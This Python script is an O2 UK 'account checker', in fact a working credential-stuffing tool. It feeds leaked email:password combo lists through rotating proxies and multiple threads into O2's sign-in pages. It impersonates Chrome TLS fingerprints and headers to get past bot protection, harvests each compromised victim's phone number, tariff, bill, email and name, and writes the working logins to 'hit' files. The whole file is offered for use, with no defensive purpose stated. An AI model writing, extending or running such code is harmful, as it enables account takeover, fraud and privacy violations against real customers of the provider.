import os
import random
import requests
import time
import warnings
import threading
import shutil
import re
import json
from queue import Queue
from datetime import datetime
from colorama import init, Fore, Style
from user_agent import generate_user_agent

# Advanced bypass libraries
try:
    import cloudscraper
    CLOUDSCRAPER = True
except ImportError:
    CLOUDSCRAPER = False

try:
    from curl_cffi import requests as curl_requests
    CURL_CFFI = True
except ImportError:
    CURL_CFFI = False

try:
    import tls_client
    TLS_CLIENT = True
except ImportError:
    TLS_CLIENT = False

warnings.filterwarnings("ignore")
init(autoreset=True)

# Code By - @LEGEND_BL
# Advanced O2.co.uk Checker with TLS Fingerprinting & Full Account Capture

CHROME_VERSIONS = ['119', '120', '121', '122', '123', '124']

def get_chrome_headers(version=None):
    """Generate realistic Chrome headers"""
    v = version or random.choice(CHROME_VERSIONS)
    return {
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-GB,en;q=0.9,en-US;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "sec-ch-ua": f'"Not_A Brand";v="8", "Chromium";v="{v}", "Google Chrome";v="{v}"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Cache-Control": "max-age=0",
        "DNT": "1",
    }

try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False

columns = shutil.get_terminal_size(fallback=(80, 20)).columns
os.system('cls' if os.name == 'nt' else 'clear')

print(f"{Fore.CYAN}{'═'*columns}")
print(f"{Fore.CYAN}{'O2.CO.UK ADVANCED CHECKER'.center(columns)}")
print(f"{Fore.YELLOW}{'Code By — @LEGEND_BL'.center(columns)}")
print(f"{Fore.CYAN}{'═'*columns}")
print(f"{Fore.GREEN}{'[TLS Fingerprint: ON] [Full Capture: ON]'.center(columns)}")
libs = []
if CLOUDSCRAPER: libs.append("CloudScraper")
if CURL_CFFI: libs.append("curl_cffi")
if TLS_CLIENT: libs.append("tls_client")
if libs:
    print(f"{Fore.GREEN}{f'[Libraries: {', '.join(libs)}]'.center(columns)}")
print(f"{Fore.CYAN}{'═'*columns}\n")

combo_input = input(f"{Fore.CYAN}Combo file (default: combo.txt): {Style.RESET_ALL}").strip()
combo_file = combo_input.strip('"').strip("'").strip() or "combo.txt"

proxy_input = input(f"{Fore.CYAN}Proxy file (default: proxy.txt): {Style.RESET_ALL}").strip()
proxy_file = proxy_input.strip('"').strip("'").strip() or "proxy.txt"

def load_combos(fn):
    try:
        fn = fn.strip().strip('"').strip("'").strip()
        if not os.path.exists(fn):
            print(f"{Fore.RED}[-] File not found: {fn}")
            return []
        with open(fn, encoding="utf-8", errors="ignore") as f:
            return [ln.strip() for ln in f if ":" in ln and ln.strip()]
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}")
        return []

def load_proxies(fn):
    try:
        fn = fn.strip().strip('"').strip("'").strip()
        if not os.path.exists(fn):
            print(f"{Fore.RED}[-] File not found: {fn}")
            return []
        with open(fn, encoding="utf-8", errors="ignore") as f:
            proxies = [ln.strip() for ln in f if ln.strip() and not ln.strip().startswith('#')]
            return proxies if proxies else []
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}")
        return []

def format_proxy(p):
    if not p:
        return None
    p = p.strip()
    
    if "://" in p:
        protocol = p.split("://")[0].lower()
        rest = p.split("://", 1)[1]
        if protocol in ['socks4', 'socks5', 'socks5h'] and not SOCKS_AVAILABLE:
            return None
        if "@" in rest:
            auth_part, host_part = rest.rsplit("@", 1)
            if ":" in auth_part:
                username, password = auth_part.split(":", 1)
                proxy_url = f"{protocol}://{username}:{password}@{host_part}"
            else:
                proxy_url = f"{protocol}://{rest}"
        else:
            proxy_url = f"{protocol}://{rest}"
        return {"http": proxy_url, "https": proxy_url}
    
    elif "@" in p:
        auth_part, host_part = p.rsplit("@", 1)
        if ":" in auth_part:
            username, password = auth_part.split(":", 1)
            proxy_url = f"http://{username}:{password}@{host_part}"
            return {"http": proxy_url, "https": proxy_url}
    
    parts = p.split(":")
    if len(parts) == 4:
        host, port, username, password = parts
        proxy_url = f"http://{username}:{password}@{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    elif len(parts) == 2:
        host, port = parts
        proxy_url = f"http://{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    return None

combos = load_combos(combo_file)
proxies = load_proxies(proxy_file)

if not combos:
    input(f"\n{Fore.RED}No combos found. Press Enter to exit...")
    exit()

use_proxies = True
if not proxies:
    print(f"{Fore.YELLOW}[!] No proxies found in {proxy_file}")
    mode_input = input(f"{Fore.CYAN}Check accounts WITHOUT proxy? (y/n, default: n): {Style.RESET_ALL}").strip().lower()
    if mode_input == 'y':
        use_proxies = False
        print(f"{Fore.YELLOW}[*] Proxy-less mode\n")
    else:
        input(f"\n{Fore.RED}Proxies required! Press Enter to exit...")
        exit()

if use_proxies:
    threads_input = input(f"{Fore.CYAN}Threads (1-30, default 5): {Style.RESET_ALL}").strip()
    threads_count = max(1, min(30, int(threads_input) if threads_input.isdigit() else 5))
else:
    threads_count = 1

print(f"\n{Fore.CYAN}Loaded {len(combos)} combos | {len(proxies)} proxies | Threads: {threads_count}")
print(f"{Fore.BLUE}[*] Starting O2 checker with TLS fingerprinting...\n")

hit_counter = fail_counter = error_counter = 0
counters_lock = threading.Lock()
print_lock = threading.Lock()
result_counter = 0

def extract_csrf(html):
    """Extract CSRF token from HTML"""
    patterns = [
        r'name=["\']?csrf[_-]?token["\']?\s*value=["\']([^"\']+)["\']',
        r'name=["\']?_token["\']?\s*value=["\']([^"\']+)["\']',
        r'name=["\']?authenticity_token["\']?\s*value=["\']([^"\']+)["\']',
        r'<meta[^>]+name=["\']?csrf[_-]?token["\']?[^>]+content=["\']([^"\']+)["\']',
        r'"csrfToken":\s*"([^"]+)"',
        r'"_csrf":\s*"([^"]+)"',
        r'data-csrf=["\']([^"\']+)["\']',
    ]
    for pattern in patterns:
        match = re.search(pattern, html, re.I)
        if match:
            return match.group(1)
    return ""

def capture_o2_account_details(session, headers, proxy_dict, use_curl=False, impersonate=None):
    """Capture full O2 account details after successful login"""
    details = {
        "phone_number": "N/A",
        "plan": "N/A",
        "data_remaining": "N/A",
        "data_total": "N/A",
        "minutes_remaining": "N/A",
        "texts_remaining": "N/A",
        "bill_amount": "N/A",
        "bill_due": "N/A",
        "account_type": "N/A",
        "contract_end": "N/A",
        "email": "N/A",
        "name": "N/A",
    }
    
    try:
        # O2 account/dashboard URLs
        dashboard_urls = [
            "https://accounts.o2.co.uk/dashboard",
            "https://accounts.o2.co.uk/account",
            "https://mymobile.o2.co.uk/",
            "https://www.o2.co.uk/myo2",
            "https://accounts.o2.co.uk/profile",
        ]
        
        for url in dashboard_urls:
            try:
                if use_curl and CURL_CFFI:
                    r = curl_requests.get(url, impersonate=impersonate, proxies=proxy_dict, timeout=20, verify=False)
                else:
                    r = session.get(url, headers=headers, proxies=proxy_dict, timeout=20, verify=False)
                
                if r.status_code == 200:
                    html = r.text
                    
                    # Extract phone number
                    phone_patterns = [
                        r'phone["\s:]+(\+?44[\d\s-]+|\d{11})',
                        r'mobile["\s:]+(\+?44[\d\s-]+|\d{11})',
                        r'msisdn["\s:]+(\+?44[\d\s-]+|\d{11})',
                        r'>(\d{5}\s?\d{6})<',
                        r'>(07\d{9})<',
                    ]
                    for p in phone_patterns:
                        m = re.search(p, html, re.I)
                        if m:
                            details["phone_number"] = m.group(1).strip()
                            break
                    
                    # Extract plan/tariff
                    plan_patterns = [
                        r'tariff["\s:]+([^"<>\n]+)',
                        r'plan["\s:]+([^"<>\n]+)',
                        r'package["\s:]+([^"<>\n]+)',
                        r'<h[123][^>]*>([^<]*(?:Pay Monthly|Pay As You Go|PAYG|Unlimited|Contract)[^<]*)</h',
                    ]
                    for p in plan_patterns:
                        m = re.search(p, html, re.I)
                        if m:
                            details["plan"] = m.group(1).strip()[:50]
                            break
                    
                    # Extract data usage
                    data_patterns = [
                        r'data["\s:]*remaining["\s:]+([^"<>\n,]+)',
                        r'([0-9.]+\s*(?:GB|MB))\s*(?:remaining|left)',
                        r'data["\s:]+([0-9.]+\s*(?:GB|MB))',
                    ]
                    for p in data_patterns:
                        m = re.search(p, html, re.I)
                        if m:
                            details["data_remaining"] = m.group(1).strip()
                            break
                    
                    # Extract minutes
                    minutes_patterns = [
                        r'minutes["\s:]*remaining["\s:]+([^"<>\n,]+)',
                        r'(\d+)\s*(?:minutes|mins)\s*(?:remaining|left)',
                        r'minutes["\s:]+(\d+|unlimited)',
                    ]
                    for p in minutes_patterns:
                        m = re.search(p, html, re.I)
                        if m:
                            details["minutes_remaining"] = m.group(1).strip()
                            break
                    
                    # Extract texts
                    texts_patterns = [
                        r'texts?["\s:]*remaining["\s:]+([^"<>\n,]+)',
                        r'(\d+)\s*texts?\s*(?:remaining|left)',
                        r'sms["\s:]+(\d+|unlimited)',
                    ]
                    for p in texts_patterns:
                        m = re.search(p, html, re.I)
                        if m:
                            details["texts_remaining"] = m.group(1).strip()
                            break
                    
                    # Extract bill amount
                    bill_patterns = [
                        r'bill["\s:]+[£$]?([0-9.,]+)',
                        r'amount["\s:]+[£$]?([0-9.,]+)',
                        r'[£$]([0-9.,]+)\s*(?:due|bill)',
                        r'balance["\s:]+[£$]?([0-9.,]+)',
                    ]
                    for p in bill_patterns:
                        m = re.search(p, html, re.I)
                        if m:
                            details["bill_amount"] = f"£{m.group(1)}"
                            break
                    
                    # Extract contract end date
                    contract_patterns = [
                        r'contract["\s:]*end["\s:]+([^"<>\n,]+)',
                        r'end["\s:]*date["\s:]+([^"<>\n,]+)',
                        r'upgrade["\s:]*date["\s:]+([^"<>\n,]+)',
                    ]
                    for p in contract_patterns:
                        m = re.search(p, html, re.I)
                        if m:
                            details["contract_end"] = m.group(1).strip()
                            break
                    
                    # Extract email
                    email_pattern = r'[\w\.-]+@[\w\.-]+\.\w+'
                    m = re.search(email_pattern, html)
                    if m:
                        details["email"] = m.group(0)
                    
                    # Extract name
                    name_patterns = [
                        r'name["\s:]+([A-Z][a-z]+\s+[A-Z][a-z]+)',
                        r'Hello,?\s+([A-Z][a-z]+)',
                        r'Welcome,?\s+([A-Z][a-z]+)',
                    ]
                    for p in name_patterns:
                        m = re.search(p, html)
                        if m:
                            details["name"] = m.group(1).strip()
                            break
                    
                    # Account type
                    if "pay as you go" in html.lower() or "payg" in html.lower():
                        details["account_type"] = "Pay As You Go"
                    elif "pay monthly" in html.lower() or "contract" in html.lower():
                        details["account_type"] = "Pay Monthly"
                    
                    # If we found phone number, we likely have valid data
                    if details["phone_number"] != "N/A":
                        break
                        
            except:
                continue
        
        # Try O2 API endpoints
        api_urls = [
            "https://accounts.o2.co.uk/api/user",
            "https://accounts.o2.co.uk/api/account",
            "https://mymobile.o2.co.uk/api/usage",
            "https://mymobile.o2.co.uk/api/balance",
        ]
        
        for url in api_urls:
            try:
                api_headers = headers.copy()
                api_headers["Accept"] = "application/json"
                
                if use_curl and CURL_CFFI:
                    r = curl_requests.get(url, impersonate=impersonate, proxies=proxy_dict, timeout=15, verify=False)
                else:
                    r = session.get(url, headers=api_headers, proxies=proxy_dict, timeout=15, verify=False)
                
                if r.status_code == 200:
                    try:
                        data = r.json()
                        if "msisdn" in data or "phoneNumber" in data:
                            details["phone_number"] = data.get("msisdn") or data.get("phoneNumber", "N/A")
                        if "tariff" in data or "plan" in data:
                            details["plan"] = data.get("tariff") or data.get("plan", "N/A")
                        if "dataRemaining" in data:
                            details["data_remaining"] = data["dataRemaining"]
                        if "balance" in data:
                            details["bill_amount"] = f"£{data['balance']}"
                        break
                    except:
                        pass
            except:
                continue
                
    except Exception as e:
        pass
    
    return details

def check_with_tls_client(email, pwd, proxy_dict):
    """Check O2 account using tls_client for advanced TLS fingerprinting"""
    if not TLS_CLIENT:
        return None, None, None
    
    try:
        proxy_url = None
        if proxy_dict and 'http' in proxy_dict:
            proxy_url = proxy_dict['http']
        
        session = tls_client.Session(
            client_identifier='chrome_120',
            random_tls_extension_order=True
        )
        if proxy_url:
            session.proxies = {'http': proxy_url, 'https': proxy_url}
        
        headers = get_chrome_headers()
        
        # O2 uses Virgin Media O2 OAuth system
        # Step 1: Access main O2 site first
        r1 = session.get("https://www.o2.co.uk/", headers=headers, timeout_seconds=30)
        
        if r1.status_code != 200:
            return "error", f"Main site: {r1.status_code}", None
        
        time.sleep(random.uniform(1, 2))
        
        # Step 2: Try to access accounts/signin
        try:
            r2 = session.get("https://accounts.o2.co.uk/signin", 
                            headers=headers, 
                            timeout_seconds=30,
                            allow_redirects=True)
            
            # OAuth redirect to virginmediao2.co.uk
            if "virginmediao2" in str(r2.url).lower() or "oauth" in str(r2.url).lower():
                # Handle OAuth flow
                csrf = extract_csrf(r2.text)
                
                login_headers = headers.copy()
                login_headers["Content-Type"] = "application/x-www-form-urlencoded"
                login_headers["Origin"] = str(r2.url).split('/')[0] + '//' + str(r2.url).split('/')[2]
                login_headers["Referer"] = str(r2.url)
                
                login_data = {
                    "username": email,
                    "password": pwd,
                    "pf.username": email,
                    "pf.pass": pwd,
                }
                if csrf:
                    login_data["csrf"] = csrf
                
                # Submit to OAuth endpoint
                r = session.post(str(r2.url), 
                               data=login_data, 
                               headers=login_headers,
                               timeout_seconds=30,
                               allow_redirects=True)
            else:
                # Direct login form
                csrf = extract_csrf(r2.text)
                
                login_headers = headers.copy()
                login_headers["Content-Type"] = "application/x-www-form-urlencoded"
                login_headers["Origin"] = "https://accounts.o2.co.uk"
                login_headers["Referer"] = "https://accounts.o2.co.uk/signin"
                
                login_data = {
                    "username": email,
                    "password": pwd,
                    "keepMeLoggedIn": "true",
                }
                if csrf:
                    login_data["_csrf"] = csrf
                
                r = session.post("https://accounts.o2.co.uk/signin", 
                               data=login_data, 
                               headers=login_headers,
                               timeout_seconds=30,
                               allow_redirects=True)
            
            txt = r.text.lower()
            url = str(r.url).lower()
            
            # Success indicators
            if any(x in url for x in ["dashboard", "account", "myo2"]) and "signin" not in url:
                details = capture_o2_account_details(session, headers, proxy_dict)
                return "hit", "Valid", details
            if any(x in txt for x in ["my o2", "your account", "log out", "sign out"]):
                details = capture_o2_account_details(session, headers, proxy_dict)
                return "hit", "Valid", details
            
            # Failure indicators  
            if any(x in txt for x in ["invalid", "incorrect", "wrong", "not recognised", "try again"]):
                return "fail", "Invalid credentials", None
            if "locked" in txt or "blocked" in txt:
                return "fail", "Account locked", None
            if r.status_code == 403:
                return "blocked", "Access blocked (403)", None
            
            return "fail", f"Status {r.status_code}", None
            
        except Exception as e:
            if "EOF" in str(e) or "connection" in str(e).lower():
                return "error", "Connection failed", None
            return "error", str(e)[:30], None
            
    except Exception as e:
        return "error", str(e)[:30], None

def check_with_curl_cffi(email, pwd, proxy_dict):
    """Check O2 account using curl_cffi for TLS fingerprinting"""
    if not CURL_CFFI:
        return None, None, None
    
    try:
        impersonate = random.choice(['chrome120', 'chrome119', 'chrome110'])
        
        headers = get_chrome_headers()
        
        # O2 uses Virgin Media O2 OAuth - try main site first
        r1 = curl_requests.get("https://www.o2.co.uk/",
                               impersonate=impersonate,
                               proxies=proxy_dict,
                               timeout=30,
                               verify=False)
        
        if r1.status_code != 200:
            return "error", f"Main site: {r1.status_code}", None
        
        time.sleep(random.uniform(1, 2))
        
        # Try to access signin
        r2 = curl_requests.get("https://accounts.o2.co.uk/signin",
                               impersonate=impersonate,
                               proxies=proxy_dict,
                               timeout=30,
                               verify=False,
                               allow_redirects=True)
        
        if r2.status_code == 403:
            return "blocked", "Access blocked (403)", None
        
        csrf = extract_csrf(r2.text)
        
        # Determine login URL based on redirect
        login_url = "https://accounts.o2.co.uk/signin"
        if hasattr(r2, 'url') and r2.url:
            login_url = str(r2.url)
        
        login_data = {
            "username": email,
            "password": pwd,
            "pf.username": email,
            "pf.pass": pwd,
            "keepMeLoggedIn": "true",
        }
        if csrf:
            login_data["_csrf"] = csrf
            login_data["csrf"] = csrf
        
        login_headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://accounts.o2.co.uk",
            "Referer": login_url,
        }
        
        r = curl_requests.post(login_url,
                               data=login_data,
                               headers=login_headers,
                               impersonate=impersonate,
                               proxies=proxy_dict,
                               timeout=30,
                               verify=False,
                               allow_redirects=True)
        
        txt = r.text.lower()
        url = str(r.url).lower() if hasattr(r, 'url') else ""
        
        # Success indicators
        if any(x in url for x in ["dashboard", "account", "myo2", "mymobile"]) and "signin" not in url:
            details = capture_o2_account_details(None, {}, proxy_dict, use_curl=True, impersonate=impersonate)
            return "hit", "Valid", details
        if any(x in txt for x in ["my o2", "your account", "log out", "sign out", "dashboard"]):
            details = capture_o2_account_details(None, {}, proxy_dict, use_curl=True, impersonate=impersonate)
            return "hit", "Valid", details
        
        # Failure indicators
        if any(x in txt for x in ["invalid", "incorrect", "wrong", "error", "try again", "not recognised"]):
            return "fail", "Invalid credentials", None
        if "locked" in txt or "blocked" in txt:
            return "fail", "Account locked", None
        
        return "fail", f"Status {r.status_code}", None
        
    except Exception as e:
        if "EOF" in str(e) or "connection" in str(e).lower():
            return "error", "Connection failed", None
        return "error", str(e)[:30], None

def check_with_cloudscraper(email, pwd, proxy_dict):
    """Check O2 account using CloudScraper"""
    if not CLOUDSCRAPER:
        return None, None, None
    
    try:
        scraper = cloudscraper.create_scraper(
            browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True},
            delay=random.randint(3, 8)
        )
        
        headers = get_chrome_headers()
        
        # Get login page
        r1 = scraper.get("https://accounts.o2.co.uk/signin", headers=headers, proxies=proxy_dict, timeout=30)
        
        if r1.status_code == 403:
            return "blocked", "Access blocked", None
        
        csrf = extract_csrf(r1.text)
        
        # Submit login
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Origin"] = "https://accounts.o2.co.uk"
        headers["Referer"] = "https://accounts.o2.co.uk/signin"
        
        login_data = {
            "username": email,
            "password": pwd,
            "keepMeLoggedIn": "true",
        }
        if csrf:
            login_data["_csrf"] = csrf
        
        r = scraper.post("https://accounts.o2.co.uk/signin", data=login_data, headers=headers,
                         proxies=proxy_dict, timeout=30, allow_redirects=True)
        
        txt = r.text.lower()
        url = r.url.lower()
        
        if any(x in url for x in ["dashboard", "account", "myo2"]) and "signin" not in url:
            details = capture_o2_account_details(scraper, headers, proxy_dict)
            return "hit", "Valid", details
        if any(x in txt for x in ["my o2", "your account", "log out", "sign out"]):
            details = capture_o2_account_details(scraper, headers, proxy_dict)
            return "hit", "Valid", details
        
        if any(x in txt for x in ["invalid", "incorrect", "wrong", "error", "not recognised"]):
            return "fail", "Invalid credentials", None
        
        return "fail", f"Status {r.status_code}", None
        
    except Exception as e:
        return "error", str(e)[:30], None

def check_with_requests(email, pwd, proxy_dict):
    """Standard requests fallback"""
    s = requests.Session()
    headers = get_chrome_headers()
    
    try:
        # Get login page
        r1 = s.get("https://accounts.o2.co.uk/signin", headers=headers, proxies=proxy_dict, timeout=30, verify=False)
        
        if r1.status_code == 403:
            return "blocked", "Access blocked", None
        
        csrf = extract_csrf(r1.text)
        
        # Submit login
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Origin"] = "https://accounts.o2.co.uk"
        headers["Referer"] = "https://accounts.o2.co.uk/signin"
        
        login_data = {
            "username": email,
            "password": pwd,
            "keepMeLoggedIn": "true",
        }
        if csrf:
            login_data["_csrf"] = csrf
        
        r = s.post("https://accounts.o2.co.uk/signin", data=login_data, headers=headers,
                   proxies=proxy_dict, timeout=30, verify=False, allow_redirects=True)
        
        txt = r.text.lower()
        url = r.url.lower()
        
        if any(x in url for x in ["dashboard", "account", "myo2"]) and "signin" not in url:
            details = capture_o2_account_details(s, headers, proxy_dict)
            return "hit", "Valid", details
        if any(x in txt for x in ["my o2", "your account", "log out", "sign out"]):
            details = capture_o2_account_details(s, headers, proxy_dict)
            return "hit", "Valid", details
        
        if any(x in txt for x in ["invalid", "incorrect", "wrong", "error", "not recognised"]):
            return "fail", "Invalid credentials", None
        
        return "fail", f"Status {r.status_code}", None
        
    except Exception as e:
        return "error", str(e)[:30], None

def check_account(email, pwd, proxy_dict):
    """Check O2 account using multiple methods"""
    
    # Method 1: tls_client (best TLS fingerprinting)
    if TLS_CLIENT:
        result, reason, details = check_with_tls_client(email, pwd, proxy_dict)
        if result and result not in ["error", "blocked"]:
            return result, reason, details
    
    # Method 2: curl_cffi
    if CURL_CFFI:
        result, reason, details = check_with_curl_cffi(email, pwd, proxy_dict)
        if result and result not in ["error", "blocked"]:
            return result, reason, details
    
    # Method 3: CloudScraper
    if CLOUDSCRAPER:
        result, reason, details = check_with_cloudscraper(email, pwd, proxy_dict)
        if result and result not in ["error", "blocked"]:
            return result, reason, details
    
    # Method 4: Standard requests
    result, reason, details = check_with_requests(email, pwd, proxy_dict)
    return result, reason, details

def format_details(details):
    """Format O2 account details for display"""
    if not details:
        return ""
    parts = []
    if details.get("phone_number", "N/A") != "N/A":
        parts.append(f"Phone: {details['phone_number']}")
    if details.get("plan", "N/A") != "N/A":
        parts.append(f"Plan: {details['plan']}")
    if details.get("data_remaining", "N/A") != "N/A":
        parts.append(f"Data: {details['data_remaining']}")
    if details.get("bill_amount", "N/A") != "N/A":
        parts.append(f"Bill: {details['bill_amount']}")
    if details.get("account_type", "N/A") != "N/A":
        parts.append(f"Type: {details['account_type']}")
    return " | ".join(parts) if parts else ""

def worker(q):
    global result_counter, hit_counter, fail_counter, error_counter
    while True:
        try:
            combo = q.get_nowait()
        except:
            break
        
        email, pwd = combo.split(":", 1)
        proxy_dict = None
        
        if use_proxies:
            for _ in range(3):
                proxy_str = random.choice(proxies)
                proxy_dict = format_proxy(proxy_str)
                if proxy_dict: break
            
            if not proxy_dict:
                with counters_lock: fail_counter += 1
                with counters_lock: num = result_counter + 1; result_counter = num
                with print_lock:
                    print(f"{Fore.WHITE}{num}. {Fore.RED}{email}:{pwd} | Bad proxy")
                q.task_done()
                continue
        
        result, reason, details = "error", "Unknown", None
        for attempt in range(3):
            result, reason, details = check_account(email, pwd, proxy_dict)
            if result not in ["error"]:
                break
            time.sleep(3 + attempt * 2)
        
        with counters_lock: num = result_counter + 1; result_counter = num
        
        if result == "hit":
            with counters_lock: hit_counter += 1
            detail_str = format_details(details)
            
            # Save to file
            with open("O2_Hits.txt", "a", encoding="utf-8") as f:
                if detail_str:
                    f.write(f"{email}:{pwd} | {detail_str} | {datetime.now().strftime('%Y-%m-%d %H:%M')} | @LEGEND_BL\n")
                else:
                    f.write(f"{email}:{pwd} | Valid | @LEGEND_BL\n")
            
            # Save detailed JSON
            if details:
                with open("O2_Hits_Detailed.json", "a", encoding="utf-8") as f:
                    json.dump({
                        "email": email,
                        "password": pwd,
                        "details": details,
                        "timestamp": datetime.now().isoformat()
                    }, f)
                    f.write("\n")
            
            with print_lock:
                if detail_str:
                    print(f"{Fore.WHITE}{num}. {Fore.GREEN}{email}:{pwd}")
                    print(f"    {Fore.CYAN}└─ {detail_str}")
                else:
                    print(f"{Fore.WHITE}{num}. {Fore.GREEN}{email}:{pwd} | Valid")
                    
        elif result == "blocked":
            with counters_lock: error_counter += 1
            with print_lock:
                print(f"{Fore.WHITE}{num}. {Fore.YELLOW}{email}:{pwd} | {reason}")
        else:
            with counters_lock: fail_counter += 1
            with print_lock:
                print(f"{Fore.WHITE}{num}. {Fore.RED}{email}:{pwd} | {reason}")
        
        q.task_done()
        time.sleep(3)

def main():
    q = Queue()
    for c in combos:
        q.put(c)
    
    open("O2_Hits.txt", "w").close()
    open("O2_Hits_Detailed.json", "w").close()
    
    for _ in range(threads_count):
        t = threading.Thread(target=worker, args=(q,), daemon=True)
        t.start()
    
    q.join()
    
    print(f"\n{Fore.CYAN}{'═'*50}")
    print(f"{Fore.CYAN}FINISHED!")
    print(f"{Fore.CYAN}{'═'*50}")
    print(f"{Fore.GREEN}Hits: {hit_counter} | {Fore.RED}Failed: {fail_counter} | {Fore.YELLOW}Blocked: {error_counter}")
    print(f"{Fore.CYAN}Hits saved to: O2_Hits.txt")
    print(f"{Fore.CYAN}Detailed JSON: O2_Hits_Detailed.json")
    input(f"\nPress Enter to exit...")

if __name__ == "__main__":
    main()
